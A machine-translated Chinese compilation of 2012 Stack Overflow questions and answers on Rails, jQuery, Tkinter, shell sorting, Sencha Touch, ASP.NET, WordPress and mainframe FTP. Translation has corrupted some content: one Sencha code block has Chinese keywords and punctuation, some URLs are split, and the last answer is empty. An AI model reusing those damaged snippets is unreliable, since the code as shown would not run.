> 时间：2012-05-18T19:03:32.693
> 
> 标签：ruby-on-rails, ruby-on-rails-3, scope

我有这个代码：

```
class Company < ActiveRecord::Base
  has_many :users, :through => :company_users do 
    def regular
      where('regular_user = ?', true)
    end

    def employee
      where('regular_user = ?', false)
    end
  end 
```

我想知道另一种写这个的方法，或者这是最有效的方法。我正在考虑用户模型中的范围。有任何想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-18T19:08:19.603

我会写`regular`和`employee`作为范围`User`：

```
class Company < ActiveRecord::Base
  has_many :users, :through => :company_users 
end

class User < ActiveRecord::Base
  scope :regular, where(:regular_user => true)
  scope :employee, where(:regular_user => false)
end 
```

# php - 从字段动态添加的jQuery不会提交

> ID：10658371
> 
> 赞同：2
> 
> 时间：2012-05-18T19:03:48.517
> 
> 标签：php, jquery, html, forms

我有一点 jQuery，它允许人们根据他们拥有的孩子的数量动态添加表单字段。

```
var childCount = $('.newchildsub').length + 1;

$('.newchildsub:last').after($('.newchildsub:first').clone().removeAttr('id').attr('id', 'child-' + childCount).insertAfter('.newchildsub:last'));

$('#child-' + childCount).find('#childId').remove();
$('#child-' + childCount).find('#gender').attr('name', 'children[child-' + childCount + '][gender]').attr('value', '');
$('#child-' + childCount).find('#month').attr('name', 'children[child-' + childCount + '][month]').attr('value', '');
$('#child-' + childCount).find('#year').attr('name', 'children[child-' + childCount + '][year]').attr('value', ''); 
```

该代码可以完美地添加字段并增加名称，但是当我单击提交时`print_r($_POST);`，动态创建的字段不存在。

下面是我的 html 示例，包括动态生成的字段 (child-3)，它基于您在 jQuery 中看到的第一个字段。

```
<div id="child-1" class="newchildsub">
    <h4>Gender: </h4><input type="hidden" id="childId" name="children[child-1][id]" value="394820">
    <select name="children[child-1][gender]" id="gender">
        <option value="">--</option>
        <option value="male" selected>Male</option>
        <option value="female">Female</option>
    </select>

    <h4>Birthday: </h4>
    <select name="children[child-1][month]" id="month">
        <option value="">Month</option>
        <option value="01">January</option>
        <option value="02" selected>February</option>
        <option value="03">March</option>
        <option value="04">April</option>
        <option value="05">May</option>
        <option value="06">June</option>
        <option value="07">July</option>
        <option value="08">August</option>
        <option value="09">September</option>
        <option value="10">October</option>
        <option value="11">November</option>
        <option value="12">December</option>
    </select>
    <select name="children[child-1][year]" id="year">
        <option value="">Year</option>
        <option value="2012" selected>2012</option>
        <option value="2011">2011</option>
        <option value="2010">2010</option>
        <option value="2009">2009</option>
        <option value="2008">2008</option>
        <option value="2007">2007</option>
        <option value="2006">2006</option>
        <option value="2005">2005</option>
        <option value="2004">2004</option>
        <option value="2003">2003</option>
        <option value="2002">2002</option>
        <option value="2001">2001</option>
        <option value="2000">2000</option>
    </select><br><br>
</div>

<div id="child-2" class="newchildsub">
    <h4>Gender: </h4>
    <input type="hidden" id="childId" name="children[child-2][id]" value="394821">
    <select name="children[child-2][gender]" id="gender">
        <option value="">--</option>
        <option value="male">Male</option>
        <option value="female" selected>Female</option>
    </select>

    <h4>Birthday: </h4>
    <select name="children[child-2][month]" id="month">
        <option value="">Month</option>
        <option value="01" selected>January</option>
        <option value="02">February</option>
        <option value="03">March</option>
        <option value="04">April</option>
        <option value="05">May</option>
        <option value="06">June</option>
        <option value="07">July</option>
        <option value="08">August</option>
        <option value="09">September</option>
        <option value="10">October</option>
        <option value="11">November</option>
        <option value="12">December</option>
    </select>
    <select name="children[child-2][year]" id="year">
        <option value="">Year</option>
        <option value="2012">2012</option>
        <option value="2011" selected>2011</option>
        <option value="2010">2010</option>
        <option value="2009">2009</option>
        <option value="2008">2008</option>
        <option value="2007">2007</option>
        <option value="2006">2006</option>
        <option value="2005">2005</option>
        <option value="2004">2004</option>
        <option value="2003">2003</option>
        <option value="2002">2002</option>
        <option value="2001">2001</option>
        <option value="2000">2000</option>
    </select><br><br>
</div>

<div id="child-3" class="newchildsub">
    <h4>Gender: </h4>
    <select id="gender" name="children[child-3][gender]">
        <option value="">--</option>
        <option selected="" value="male">Male</option>
        <option value="female">Female</option>
    </select>

    <h4>Birthday: </h4>
    <select id="month" name="children[child-3][month]">
        <option value="">Month</option>
        <option value="01">January</option>
        <option selected="" value="02">February</option>
        <option value="03">March</option>
        <option value="04">April</option>
        <option value="05">May</option>
        <option value="06">June</option>
        <option value="07">July</option>
        <option value="08">August</option>
        <option value="09">September</option>
        <option value="10">October</option>
        <option value="11">November</option>
        <option value="12">December</option>
    </select>
    <select id="year" name="children[child-3][year]">
        <option value="">Year</option>
        <option selected="" value="2012">2012</option>
        <option value="2011">2011</option>
        <option value="2010">2010</option>
        <option value="2009">2009</option>
        <option value="2008">2008</option>
        <option value="2007">2007</option>
        <option value="2006">2006</option>
        <option value="2005">2005</option>
        <option value="2004">2004</option>
        <option value="2003">2003</option>
        <option value="2002">2002</option>
        <option value="2001">2001</option>
        <option value="2000">2000</option>
    </select><br><br>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:15:01.707

根据您的代码，您正在更改`id`，但不是克隆字段的`name` **属性**。

该`name`属性必须是唯一的，这就是为什么您看不到动态添加的字段的原因。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:15:56.557

将您的 name 属性添加到您的 jQuery 代码中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T19:27:16.130

您必须管理输入元素的名称。您可以为它们提供唯一的名称，也可以将名称作为未索引的数组（如`children[gender][]`. Php 将通过自动创建索引来解析它们并将其视为数组。[此链接可能会有所帮助](http://www.php.net/manual/en/faq.html.php#faq.html.arrays)

# css - 使用基于类的jQuery添加css

> ID：10658374
> 
> 赞同：0
> 
> 时间：2012-05-18T19:03:51.183
> 
> 标签：css, jquery

寻求解决我的问题...

我使用此脚本在此处的另一个线程中部分找到了答案

```
$(function () {
$(".myclass").hover(function ()
{}, function ()
{
    $(".myclass>li").fadeTo(200, 1)
});
$(".myclass>li").hoverIntent(function ()
{
    $(this).attr("id", "current");
    $(this).siblings().fadeTo(200, .6);
    $(this).fadeTo(300, 1)
}, function ()
{
    $(".myclass>li").removeAttr("id");
    $(this).fadeTo(200, 1)
})}) 
```

当列表中的一个项目悬停时，脚本会淡出所有其他项目。原始演示在这里[http://jsbin.com/usobe](http://jsbin.com/usobe)

这在我的网站上工作正常，尽管列表（缩略图网格）是更大滑块脚本的一部分，它通过 ajax 加载“预览”。单击列表项时，隐藏部分会在页面上展开，滑块脚本会为列表项分配“活动”类。

当隐藏部分打开时，我希望激活的缩略图保持 1 不透明度，而其余部分淡化为 0.6，与使用上述脚本的悬停效果完全相同。当您单击缩略图以激活 ajax 脚本时，我想要实现的目标变得显而易见。是否可以使用`active`该类来实现这一点，即如果类未`active`设置为 .6 不透明度？

提前致谢

- - 编辑

感谢大家的建议-到目前为止我运气不佳！使用上面的代码，是否可以对其进行修改，以便在单击列表项时保持指定的不透明度级别？我想那会很好。然后我可以使用`onclick`I guess 在隐藏的 div 关闭时将所有项目淡化为完全不透明。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T20:24:12.873

我试图猜测您的代码是如何工作的，据我所知，您应该这样做：

```
// this is the selector that gets the click on the thumbnail
$('li.item').click(function() {
    // fade all the thumbnails to op 1.0
    $('#li.item').css('opacity', '.6');
    // let the active thumbnail to 1.0
    $(this).css('opacity', 1);

    //show your hidden div
}); 
```

然后，当您关闭隐藏的 div 时：

```
$('div#hiddenDiv').onClose(function()
    // about to close
    $(this).fadeTo('fast', 1);
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T20:16:36.830

您可以使用针对 zetaThumbs li 元素的点击，将当前目标设置为 1 并将其兄弟设置为 .6

```
 $('.zetaThumbs li').click(function(){
    $(this).css({'opacity':1}).siblings().css({'opacity':.6});
 }) 
```

# c++ - 如何确定我在无线网络中连接的接入点的延迟和数据包丢失？

> ID：10658375
> 
> 赞同：0
> 
> 时间：2012-05-18T19:03:52.073
> 
> 标签：c++, c, linux, network-programming, wifi

嗨，我是交流程序员，但我以前从未为网络编程过。我想用 c 或 c++ 为 Linux 编写一个程序，该程序将能够验证接入点的延迟和数据包丢失。我在想也许 ICMP 请求/响应（ping）不是一个坏主意？如果上述想法很好，如何实现？我必须使用哪些库来完成它？我之前使用 nmap 软件进行扫描（它支持的一种扫描类型是 ping 扫描），我认为 nmap 正在使用**libpcap**库。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:19:27.890

对于 linux，您可以编写一个程序来解析`/proc/net/wireless`文件。让内核为您获取信息。
`iwconfig`从那里获取信息（[http://linux.die.net/man/8/iwconfig](http://linux.die.net/man/8/iwconfig)）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-23T14:12:31.870

**BWPing**是一种使用 Internet 控制消息协议 (ICMP) 回显请求/回显应答机制来测量两个主机之间的带宽和响应时间的工具。它的源代码是我一直在寻找的 - [http://sourceforge.net/projects/bwping/files/](http://sourceforge.net/projects/bwping/files/)。

# python - 具有多个类和 Tkinter 的 Python 属性错误

> ID：10658376
> 
> 赞同：0
> 
> 时间：2012-05-18T19:03:55.240
> 
> 标签：python, user-interface, attributes, tkinter, syntax-error

我正在尝试使用 Tkinter 创建一个 gui，它获取用户名和密码并连接到远程服务器并执行一项功能。我将一些杂乱的代码拼凑在一起，它或多或少地起作用了，但是当我尝试在一个整洁的模块中重新创建它时，它就坏了。它可能是一个新手python错误，但我无法发现它。编辑：澄清一下，当它起作用时，唯一的类是 setupGui 并且任何方法都在该类下。现在我已经将 gui 与方法分开了，它不起作用。

```
class setupGui(object):
   def __init__(self, parent):
      ##omited general frame stuff 

       self.userIn = ttk.Entry(self.topFrame, width = 20)
       self.userIn.grid(row = 1, column = 1)
       self.passIn = ttk.Entry(self.topFrame, width = 20, show ="*")
       self.passIn.grid(row = 2, column = 1)

       #Buttons
       self.setupbtn = ttk.Button(self.topFrame, text = "Start Setup", command = setup().startSetup())
       self.setupbtn.grid(row = 3, column = 0, pady = 10)

class setup(object):
   def__init__(self):
      self.userName = setupGui.userIn.get()
      self.userPass = setupGui.passIn.get()
   def startSetup(self):
      self.another_related_fucntion # about 4 related functions actually

if __name__ == '__main__':
root = Tk()
gui = setupGui(root)
root.mainloop() 
```

而且，如果我没有将命令附加到按钮上，那么一切正常（但显然除了看起来很漂亮之外确实蹲着）。当我附加命令时，我收到了这个错误：

```
Traceback (most recent call last):
 File "macSetup.py", line 211, in <module>
 gui = setupGui(root)
 File "macSetup.py", line 45, in __init__
self.setupbtn = ttk.Button(self.topFrame, text = "Start Setup", command = setup().startSetup())
File "macSetup.py", line 69, in __init__
self.userName = setupGui.userIn.get()
AttributeError: type object 'setupGui' has no attribute 'userIn' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:14:09.563

在您的代码中，`userIn`设置为`setupGui`对象的实例变量，而不是`setupGui`类本身的属性。

最简单的解决方案是将`setupGui`和`setup`类合并`startSetup`为 的方法`setupGui`，然后`command=self.startSetup`在初始化时使用`setupbtn`-this 调用`startSetup`作为绑定方法，`self`因此应该引用该`setupGui`对象，然后您可以使用该对象，`self.userIn.get()`然后继续使用`self.passIn.get()`。

如果您希望将类中的逻辑保留在`setup`类之外，则`setupGui`可以像这样将其分开：

```
class setup(object):
    def __init__(self, username, userpass):
        self.userName = username
        self.userPass = userpass

    def startSetup(self):
        # as before 
```

然后将此方法添加到`setupGui`类中：

```
def dosetup(self):
    setup(self.userIn.get(), self.passIn.get()).startSetup() 
```

并实例化`Button`with `command=self.dosetup`。（我个人会让这个`setup`类成为一个独立的函数，但我不知道你的`startSetup`例程实际上有多复杂，所以我认为你有充分的理由让它成为一个类。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T20:38:28.627

该`command`属性引用了一个函数，但您正在调用该函数并将结果提供给该`command`属性。最终结果是您在创建按钮时调用 setup 函数，而不是在单击按钮时调用。事情还没有完全初始化，所以你得到了错误。

你这样做：

```
self.setupbtn = ttk.Button(self.topFrame, text = "Start Setup", command = setup().startSetup()) 
```

...当你应该做这样的事情时：

```
self.setupbtn = ttk.Button(self.topFrame, text = "Start Setup", command = setup().startSetup) 
```

请注意缺少尾随`()`on `startSetup`。

如果您不想`setup`在单击按钮之前实例化，您有几个选择。可以说，最好的方法是创建一个方法：

```
def _launch_setup(self):
    setup().setupGui()
...
self.setupbtn = ttk.Button(..., command=self._launch_setup) 
```

您也可以使用 lambda，但在这种情况下，我推荐使用命名方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T19:11:19.200

类`setupGui`本身没有属性`userIn`。

在您的`__init__`方法中，`setupGui`将属性赋予*实例*，而不是类。

# shell - Shell one-liner 将一行添加到已排序的文件

> ID：10658380
> 
> 赞同：2
> 
> 时间：2012-05-18T19:04:20.467
> 
> 标签：shell, sorting, sed, pipe

我想在文本文件中添加一行，以便对文本文件最初排序的结果进行排序。例如：

```
cp file tmp; echo "new line" >> tmp; sort tmp > file; rm -f tmp 
```

我真的很想不带临时文件和不带分号（使用管道代替？）；使用`sed`是可以接受的。这可能吗？如果可以，怎么做？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-18T19:26:22.470

这是我能想到的没有任何临时文件的最短的一个班轮：

```
$ echo "something" >> file; sort file -o file 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-05-18T19:30:50.237

```
echo "New Line" | sort -o file - file 
```

这`-o file`意味着将结果写入文件（并且将任何输入文件作为输出文件是明确安全的）。`-`本身的意思是“读取标准输入”，其中包含新的信息行。`file`末尾的意思是“也读过” `file`。这适用于大约 1978 年（至少）第 7 版 UNIX™ 起的任何 Unix 排序，甚至可能在此之前。没有临时文件或对其他实用程序的依赖项。

鉴于单行已“排序”并且文件也已排序，您可以通过合并两个排序的输入来加快处理速度：

```
echo "New Line" | sort -o file -m - file 
```

即使是非常古老的排序命令，这也适用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-18T19:29:36.433

*是的，假设*它们没有选项卡，您将需要使用它们或`comm`将它们放在一起（如果它们已经预先排序） ，这将为您节省排序（根据文件大小可能会产生临时文件和开销）。

 *选择： `comm -3 file <(echo "new line") |tr -d '\t'`

这可能是“最短的”： `sort -m file <(echo "new line")`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-18T19:17:24.763

您可以在没有任何分号和临时文件的情况下执行此操作，但可能不能不依赖某些可能并非无处不在的实用程序（例如带有就地文件修改的 awk 或 perl）。

为什么不想使用临时文件或分号？

编辑：既然分号是可以的，怎么样：

```
val=$(cat file); { echo "$val"; echo "new line"; } | sort > file 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-11-22T19:44:04.600

**大文件/性能**：

将您的文件转换为具有单个索引列的 SQLite 数据库并进行查询。

或者自己重新实现基于文件的 B 树或哈希映射，SQLite 如何实现索引...

我认为不可能有效地插入已排序的文本文件：即使您进行二进制搜索，您仍然必须复制插入点之后的所有内容，并且磁盘操作将成为瓶颈：[https://unix.stackexchange .com/questions/87772/add-lines-to-the-beginning-and-end-of-the-huge-file](https://unix.stackexchange.com/questions/87772/add-lines-to-the-beginning-and-end-of-the-huge-file)

对于搜索，`sgrep`可能有效：[https ://askubuntu.com/questions/423886/efficiently-search-sorted-file/701237#701237](https://askubuntu.com/questions/423886/efficiently-search-sorted-file/701237#701237)*

# ios - 如何在 iOS 4 中摆脱 UIPopoverController 中奇怪的黑色导航栏

> ID：10658394
> 
> 赞同：0
> 
> 时间：2012-05-18T19:05:26.473
> 
> 标签：ios, ipad, uipopovercontroller

我在我的 iPad 应用程序中使用了弹出框控制器。在 iOS 5 中，弹出框如下所示：

![在此处输入图像描述](../Images/dbdbb0da38272b4b82e35020819a84c9.png)

在 iOS 4 中，它看起来像这样：

![在此处输入图像描述](../Images/ec149fe9c98ebf372bea050df939ff2d.png)

我怎样才能摆脱这个奇怪的黑色背景？

**更新：**我很确定这是一个自找的伤口，因为我公司生产的其他应用程序没有这个奇怪的黑色导航栏问题，即使在 iOS 4 中运行也是如此。我们必须有代码改变这个背景，但我'不知道那会怎么做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-19T19:00:16.520

这确实是自找的伤口。如果有人感兴趣，这个类别：

```
@implementation UINavigationBar (BackgroundImage)
- (void)drawRect:(CGRect)rect {

    UIImage *image = [UIImage imageNamed: @"top-toolbar.png"];
    [image drawInRect:CGRectMake(0, 0, self.frame.size.width, self.frame.size.height)];

}
@end 
```

... 将让您在 iOS 5 之前的版本中自定义导航栏，同时如果您忘记自己将导航栏放在那里，也会让您发疯。

# pagination - 使用特殊最近帖子插件（WordPress）进行分页

> ID：10658396
> 
> 赞同：2
> 
> 时间：2012-05-18T19:05:44.587
> 
> 标签：pagination, wordpress

我正在使用 WordPress 中的“特别近期帖子”插件。它被用来显示文章的标题图像和摘录，然后您可以点击查看全文。

您可以在该插件上设置参数，以告知您希望显示多少最近的文章。基本上我想做的是在主页上显示前五篇文章，然后让溢出转到新页面（就像“旧帖子”类型的东西，每页有五个帖子）。

谁能帮我指出正确的方向？每次我用谷歌搜索这个问题时，它都不太明白......谢谢。

* * *

编辑：

我看到了第一个答案，虽然它正朝着正确的方向发展，但它并没有像我想要的那样自动生成新页面。我想让最近的特殊帖子溢出自动生成一个新的“上一个”页面。我知道我可以手动执行此操作，但我正在处理的博客每天都会更新，因此在我进行过程中不断创建新页面将非常耗时。有人可以指出我正确的方向吗？

* * *

编辑：这是我在 index.php 上的完整代码：

`<?php get_header(); ?>`

`<?php c2c_the_category_image($image_extensions='png gif jpg', $image_dir='/wp-content/images/', $use_name_if_no_image=true, $start_from='begin', $limit=999); ?>`

`<?php echo do_shortcode("[srp srp_number_post_option='34' srp_thumbnail_option='yes' srp_widget_title_hide_option='yes' srp_post_date_option='no' srp_wdg_excerpt_length='50' srp_wdg_excerpt_length_mode='fullexcerpt']"); ?>`

`<?php get_sidebar(); ?>`

`<?php get_footer(); ?>`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-18T23:34:10.053

该插件有一个参数，来自文档：

```
//Global Post Offset (to skip an arbitrary number of posts from the beginning)
srp_post_global_offset_option => numeric 
```

因此，在第二页上，要跳过 5 个帖子然后显示接下来的 5 个帖子，您需要这样的内容：

```
[srp srp_number_post_option='5' srp_post_global_offset_option='5'] 
```

**文档：** [http ://wordpress.org/extend/plugins/special-recent-posts/installation/](http://wordpress.org/extend/plugins/special-recent-posts/installation/)

编辑：要回答有关生成新页面的问题，从技术上讲，您不会。您将拥有一个显示不同帖子的页面，就像它是一个不同的页面一样。您可能需要使用查询字符串（URL 参数）。但是，您不能将 PHP 直接放入 wordpress 帖子中，因此您需要修改 PHP 文件，或者获取类似 Shortcode Exec PHP 的 WordPress 插件，这样您就可以从 URL 中获取页码参数并将其放入最近特殊帖子的简码。

**基于您的 index.php 代码的示例：**

```
$offset = ($_GET['page'] * 5) - 5;
echo do_shortcode("[srp srp_number_post_option='34' srp_thumbnail_option='yes'
srp_widget_title_hide_option='yes' srp_post_date_option='no'
srp_wdg_excerpt_length='50' srp_wdg_excerpt_length_mode='fullexcerpt'
srp_post_global_offset_option='".$offset."']"); 
```

使用您的*第一*页

```
index.php?page=1 
```

还有你的“下一页”链接：

```
$next = $_GET['page'] + 1;
echo '<a href="index.php?page='.$next.'">Next Page</a>'; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-22T16:33:14.917

[在最近](http://wordpress.org/support/plugin/special-recent-posts)的特殊帖子插件之前我从未工作过。所以我想给WordPress查询发布解决方案。

首先，要获取主页（index.php）中最近的五个帖子，请使用以下查询参数。

```
$query = new WP_Query( 'posts_per_page=5'); 
```

其次，要在其他页面中列出较旧的帖子，请使用以下查询参数。

```
$query = new WP_Query( array( 'posts_per_page' => 5, 'offset' => 5 ) ); 
```

上面的查询将从每页 6 和 5 个帖子中获取帖子。要添加分页，请添加分页参数[。请参阅 WP_Query](http://codex.wordpress.org/Class_Reference/WP_Query)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-05T14:45:38.493

分页功能[现在可](http://www.specialrecentposts.com)在新的特别近期帖子专业版 3.0.0 版中使用

# ruby - Ruby：窗口打印屏幕win32API调用

> ID：10658397
> 
> 赞同：0
> 
> 时间：2012-05-18T19:05:46.187
> 
> 标签：ruby

当您按下 alt+printscreen（至少在 Windows 中）时，您将获得当前活动（并且可见？）窗口的屏幕截图。

如何使用 win32Api 调用来调用它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:34:35.580

怎么样`Win32::Screenshot`？
[https://github.com/jarmo/win32screenshot](https://github.com/jarmo/win32screenshot)

```
gem install win32screenshot 
```

```
require 'win32/screenshot'

# Take a screenshot of the foreground
Win32::Screenshot::Take.of(:foreground).write("image.png")

# Take a screenshot of the window with the specified title
Win32::Screenshot::Take.of(:window, :title => "Abc").write("image.bmp") 
```

# rest - Asp.net web api未设置内容长度标头

> ID：10658399
> 
> 赞同：3
> 
> 时间：2012-05-18T19:05:55.370
> 
> 标签：rest, asp.net-mvc-4, asp.net-web-api, iis-7.5

我正在使用 web api 构建一个 RESTful 服务。我的客户端是一个 HTML5/Jquery 应用程序。该服务和应用程序在 IIS 5.1 上完美运行。但是当我切换到 IIS 7.5 时，我看到响应包含一个 Transfer-Encoding: chunked header 并且我的客户端不理解/呈现 UI 元素（顺便说一下，这个 HTML 5/JQuery 的东西是由第三方完成的，我不想要更改他们的代码。我为什么要这样做？毕竟，在我们迁移到 IIS 7.5 之前它运行良好）。我的问题是：

1.  我如何/在哪里在 web api 中添加“内容长度”http 标头，以便 IIS 不会“块”对响应进行编码？
2.  有没有办法在 IIS 7.5 的站点/服务器级别禁用此编码？

当我从浏览器/提琴手访问服务时，我得到了正确的响应（xml/json）。我正在使用 Json.net 格式化程序。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T09:34:56.483

利用

```
myHttpResponseMessage.Headers.TransferEncodingChunked = false; 
```

关闭分块编码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T12:49:27.353

这可能是由于这个在 beta 后修复的错误：

“DevDiv 388456 - 当内容长度已知时，WebHost 不应使用传输编码分块” [http://aspnetwebstack.codeplex.com/SourceControl/changeset/changes/06f52b894414#src%2fSystem.Web.Http.WebHost%2fHttpControllerHandler.cs](http://aspnetwebstack.codeplex.com/SourceControl/changeset/changes/06f52b894414#src%2fSystem.Web.Http.WebHost%2fHttpControllerHandler.cs)

设置 response.Headers.TransferEncodingChunked = false; 没有为我解决这个问题。

此外，由于在顶部按下“解码”按钮，您可能会在 Fiddler 中获得不同的结果，该按钮会自动对响应进行去块化并从响应中删除传输编码标头。

# sencha-touch-2 - 如何在拉取刷新时添加自定义更新？

> ID：10658400
> 
> 赞同：3
> 
> 时间：2012-05-18T19:06:02.803
> 
> 标签：sencha-touch-2, pull-to-refresh

在标准的“Pull to Refresh”插件中，列表存储得到更新。但是，我有两个列表，我需要为我的详细列表更新不同的商店。如何覆盖更新事件并重新加载我的其他商店？我尝试添加一个简单的侦听器，但它没有触发。

[更新]

我从[Sencha 网站](http://www.sencha.com/forum/showthread.php?184612-Documentation-pullRefresh-Example-and-can-t-post-comments)得到了这个片段来工作：

```
插件：[
          {
             xclass: 'Ext.plugin.PullRefresh',
              pullRefreshText: '下拉查看更多新事件！',
              refreshFn：函数（插件）{
                  console.log("我被拉");
              }
           }
          ]

```

原始代码：

```
Ext.define('SenchaFiddle.view.ListView', {
    扩展：'Ext.dataview.List'，
    xtype: '主列表',

    配置：{
        插件：[
            '拉刷新'，
            {
                pullRefreshText: '去做吧！',
                类型：'列表分页'，
                // 不要提供“加载更多”消息
                自动分页：假，
 刷新Fn：函数（）{             
                  console.log("繁荣");
                },

                听众：{
                    'updatedata'：函数（插件，列表）{
                        console.log("获取数据");
                    }
                } 
            }
        ],
        布局：'适合'，
        宽度：300，
        itemTpl: '{文本}'

    }
});

```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-06-03T16:37:07.133

在 Sencha Touch 2.2 中，他们`refreshFn`从 Ext.util.PullRefresh 中删除了配置。通过覆盖Ext.util.PullRefresh 中的函数，我已经成功地`refreshFn`使用新版本的 Sencha Touch实现了自定义......`fetchLatest`

```
Ext.define('MyApp.overrides.PullRefreshOverride', {
    override: 'Ext.plugin.PullRefresh',

    fetchLatest: function() {
        var list = this.getList();

        switch(list.getItemId()) {
            case "list1": 
                this.updateStore1();
                break;

            case "list2": 
                this.updateStore2();
                break;
        }

        this.callParent(arguments);
    },

    //My own custom function to add to the plugin
    updateStore1: function() {
        //Code to update store 1
    },

    //My own custom function to add to the plugin
    updateStore2: function {
        //Code to update store 2
    }
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-19T02:52:26.737

查看**sencha-touch-all-debug**`Ext.plugin.PullRefresh`中的定义，我看到了这个配置：

 **```
 /*
     * @cfg {Function} refreshFn The function that will be called to refresh the list.
     * If this is not defined, the store's load function will be called.
     * The refresh function gets called with a reference to this plugin instance.
     * @accessor
     */
    refreshFn: null, 
```

您可以通过`refreshFn`config.xml 实现所需的功能，这可能是一个好主意。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-10-03T05:44:08.377

对于那些需要`refreshFn`靠背的人，有一个[PullRefreshFn](https://github.com/p5hema2/Sencha-PullRefresh-RefreshFn/blob/master/ST2.3/PullRefreshFn.js)扩展`PullRefresh`。

我需要 PullRefresh 由 Panel 而不是 List 或 Dataview 触发，并且我还需要在用户触发 PullRefresh 时手动加载数据并将数据设置到我的 Dataview。

为此，我需要`refreshFn`Sencha 2.2 之前存在的配置功能，所以这是我的实现。

* * *

**PullRefreshFn**（修改）

```
Ext.define('Ext.plugin.PullRefreshFn', {
    extend: 'Ext.plugin.PullRefresh',
    alias: 'plugin.pullrefreshfn',
    requires: ['Ext.DateExtras'],

    config: {
        /**
         * @cfg {Function} refreshFn The function that will be called to refresh the list.
         * If this is not defined, the store's load function will be called.
         */
        refreshFn: null
    },

    fetchLatest: function() {
        if (this.getRefreshFn()) {
            this.getRefreshFn().call();
        } else {
            var store = this.getList().getStore(),
                proxy = store.getProxy(),
                operation;

            operation = Ext.create('Ext.data.Operation', {
                page: 1,
                start: 0,
                model: store.getModel(),
                limit: store.getPageSize(),
                action: 'read',
                sorters: store.getSorters(),
                filters: store.getRemoteFilter() ? store.getFilters() : []
            });

            proxy.read(operation, this.onLatestFetched, this);
        }
    }

}); 
```

* * *

**我的控制器**

```
Ext.define('myApp.controller.MyController', {
    extend: 'Ext.app.Controller',
    requires: ['Ext.plugin.PullRefreshFn'],

    ...

    // More code

    ...

    // Binds the Pull Refresh to myPanel view item.
    // myPanel is a panel. Not list nor dataview.
    setPullRefresh: function () {
        var me = this;

        // We get reference to myPanel and
        // we set PullRefreshFn
        this.getMyPanel().setPlugins([{
            xclass: 'Ext.plugin.PullRefreshFn',
            docked: 'top',

            // We set autoSnapBack to false,
            // as we are going to trigger this manually
            autoSnapBack: false,

            // refreshFn will be called upon user releasing for refresh.
            refreshFn: function() {

                // This is a custom function that sets data to our dataview list.
                // When it's done setting data, we trigger the snapBack.
                me.populateMylist(function () {
                    me.getMyPanel().getPlugins()[0].snapBack(true);
                });
            }
        }]);
    }

}); 
```**

# eclipse - STS（Spring Tools Suite）在我更新时写入 STS.ini，与我自己的配置合并

> ID：10658401
> 
> 赞同：0
> 
> 时间：2012-05-18T19:06:20.610
> 
> 标签：eclipse, sts-springsourcetoolsuite

为了提高我的 STS 性能，我在 STS.ini 中添加了一些参数。但是每次我更新工具时，它都会将自己的配置放在 STS.ini 文件的开头，将我的配置放到最后，有时会重复几个参数。

还有其他方法可以避免这种情况吗？

现在，每次更新工具时，我都需要备份文件并检查参数...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T04:09:24.430

我倾向于从命令行启动 Eclipse 和 STS。我创建了一堆 shell 脚本，一个用于我运行的每个 Eclipse/STS 变体。这确保了每次启动都准确地具有我需要的参数。

例如，我有一堆这样的脚本：

```
[21:09] ~/Eclipse
$ more eclipse_42.sh
Installations/Eclipse4.2.M6/Eclipse -data \
    "/users/Andrew/Eclipse/Workspaces/workspace_42" \
    -vmargs -Xmx1024M -XX:PermSize=64M -XX:MaxPermSize=256M 
```

我喜欢从终端运行，这样您就可以看到发送到 sysout 的内容。这也可以从 Finder 窗口启动。

我在 Mac 上运行，但你可以在 Linux 或 Windows 上做类似的事情。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T19:25:14.973

刚刚想到另一个可能的答案。我还没有尝试过，但它可以工作。

不要执行“检查更新”，而是转到安装管理器帮助 -> 安装新软件...

使用 STS 更新站点，选择您想要更新的所有组件（**除了**SpringSource 工具套件（必需）和 SpringSource 工具套件包（如果您看到的话））。

我认为正是这两个组件改变了 STS.ini。我唯一不确定的是是否可以在不更新该软件包的情况下更新单个组件。

# ftp - ftping 到 MainFrame 时如何计算存储空间

> ID：10658405
> 
> 赞同：2
> 
> 时间：2012-05-18T19:06:47.047
> 
> 标签：ftp, storage, mainframe, jcl

FTP 到 MainFrame 时如何计算存储空间？有人告诉我 LRECL 将永远保持“80”。不知道如何根据文件大小动态计算 PRI 和 SEC ...

```
 QUOTE SITE LRECL=80 RECFM=FB CY PRI=100 SEC=100 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T13:51:05.613

如果站点有 SMS，则不需要，但如果需要计算磁道数是文件大小（以字节为单位）除以 56,664，或者柱面数是文件大小（以字节为单位）除以849,960。在任何一种情况下，你都会四舍五入。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-22T15:15:53.500

